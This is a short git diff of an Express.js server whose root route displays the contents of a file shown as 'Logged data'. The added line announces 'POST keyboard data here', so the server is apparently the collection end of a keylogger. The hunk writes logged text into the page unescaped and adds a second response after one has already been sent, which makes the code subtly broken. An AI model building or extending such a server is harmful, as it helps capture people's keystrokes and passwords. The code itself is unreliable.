@@ -37,6 +37,7 @@ app.get("/", (req, res) => {
       flag: "r",
     });
     res.send(`<h1>Logged data</h1><p>${klFile.replace(/\n/g, "<br>")}</p>`);
+    res.send("✅ Server is alive! POST keyboard data here.");
   } catch {
     res.send("<h1>Nothing logged yet.</h1>");
   }
